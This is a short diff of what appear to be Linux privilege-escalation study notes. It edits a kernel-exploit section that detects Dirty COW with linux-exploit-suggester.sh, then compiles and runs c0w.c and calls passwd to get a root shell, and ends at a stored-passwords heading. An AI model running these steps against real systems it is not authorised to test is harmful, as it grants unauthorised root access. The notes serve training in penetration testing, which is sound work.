@@ -20,14 +20,14 @@ To download the tools click below, this tools are used for enumeration and explo
 
 # 1. Privilage Escalation- Kernel Exploit
 ## Detection
-1. `linux-exploit-suggester.sh`	{ suggests the expolits with cve }	-->  **vulnerable to dirtycow**
+1. `linux-exploit-suggester.sh`	-->  **vulnerable to dirtycow**
 
 ## Exploitation
 1. `gcc -pthread c0w.c -o c0w`
 
 2. `./c0w`
 
-3. `passwd`		>> root shell
+3. `passwd`		--> root shell
 
 # 2. Privilage Escalation - Stored Passwords (config files)
 
